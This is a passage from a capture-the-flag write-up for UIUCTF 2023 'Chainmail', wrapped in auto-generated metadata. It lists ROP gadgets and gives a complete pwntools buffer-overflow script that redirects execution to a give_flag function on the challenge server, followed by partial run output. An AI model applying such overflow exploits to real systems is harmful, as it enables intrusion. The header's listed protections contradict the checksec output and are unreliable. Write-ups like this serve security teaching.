@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://infosecwriteups.com/uiuctf-2023-chainmail-a4b2de56a680
+CHALLENGE: UIUCTF 2023 — Chainmail. Chainmail | by Szigecsán Dávid
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: rop_chain
+DIFFICULTY: Unknown
+PROTECTIONS: NX, PIE, Canary, RELRO
+KEY_FUNCTIONS: None
+KEY_TECHNIQUE: Writeup for UIUCTF 2023 — Chainmail. Chainmail | by Szigecsán Dávid — rop_chain exploitation technique.
+---
+rax 0x0000000000401183 : test eax, eax ; je 0x401190 ; mov edi, 0x404068 ; jmp rax 0x00000000004011c5 : test eax, eax ; je 0x4011d0 ; mov edi, 0x404068 ; jmp rax 0x000000000040100f : test rax, rax ; je 0x401016 ; call rax After that, we have our complete solution. #!/usr/bin/python import argparse import pwn # ================================================ #                  Boilerplate # ================================================ parser = argparse.ArgumentParser() parser.add_argument('destination', type=str, choices={'local', 'remote'}) parser.add_argument('--target', '-t', type=str, required=False) parser.add_argument('--port', '-p', type=str, required=False) args = parser.parse_args() # ================================================ #               Exploit generation # ================================================ pwn.context.binary = binary = pwn.ELF('./chal') pwn.context.log_level = 'info' give_flag_return_address = pwn.p64(binary.symbols.give_flag) # MOVAPS issue ret_address = b'' if args.destination == 'remote': ret_address = pwn.p64(0x40101a) payload = b'A' * 64 + b'B' * 8 + ret_address + give_flag_return_address # ================================================ #              Local / GDB / Remote # ================================================ if args.destination == 'local': p = pwn.process() else: if not args.target or not args.port: pwn.error('Please provide target and port!') exit() p = pwn.remote(args.target, args.port) # ================================================ #           Send exploit & Receive flag # ================================================ p.recv() p.sendline(payload) p.recvuntil("Jim\n") pwn.warning("Flag: " + p.recv().decode('utf-8')) p.interactive() We can run it on the local or remote server, both cases will work properly. $ ./solution.py -t chainmail.chal.uiuc.tf -p 1337 remote [*] '/tmp/aaa/chal' Arch:     amd64-64-little RELRO:    Partial RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0
